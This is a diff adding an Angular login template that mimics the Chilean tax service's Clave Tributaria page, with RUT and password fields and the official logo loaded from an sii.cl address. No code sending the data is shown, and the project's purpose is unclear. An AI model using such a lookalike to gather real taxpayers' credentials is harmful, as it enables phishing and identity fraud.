@@ -1,0 +1,52 @@
+<app-cabecera-ingreso></app-cabecera-ingreso>
+<app-cabecera></app-cabecera>
+
+<section class="login-panel">
+  <div class="form-container">
+    <h2>Identificación de Contribuyentes</h2>
+
+    <div class="form-card">
+      <div class="form-header">
+        <img src="https://zeusr.sii.cl//AUT2000/img/logo_ct.png" alt="Clave Tributaria" />
+      </div>
+
+      <form>
+        <label for="rut">RUT</label>
+        <input type="text" id="rut" placeholder="Ej: 123456789" />
+
+        <label for="clave">Ingresar Clave Tributaria</label>
+        <input type="password" id="clave" />
+
+        <button class="btn-ingresar" (click)="ingresar()">🔑 INGRESAR</button>
+      </form>
+
+      <div class="form-links">
+        <a href="#">🔓 Solicitar Clave</a>
+        <a href="#">🔁 Recuperar Clave</a>
+        <a href="#">🛡️ Ingresar con Certificado Digital</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="security-tips">
+    <div class="tip">
+      <span>💻</span>
+      <p>
+        No solicitaremos claves ni datos personales en nuestros canales de
+        contacto.
+      </p>
+    </div>
+    <div class="tip">
+      <span>🔑</span>
+      <p>Cambia la Clave Tributaria periódicamente.</p>
+    </div>
+    <div class="tip">
+      <span>✉️</span>
+      <p>
+        No enviamos por correo electrónico ningún tipo de link o acceso directo
+        donde solicitemos ingresar la clave.
+      </p>
+    </div>
+  </div>
+</section>
+<app-pie></app-pie>
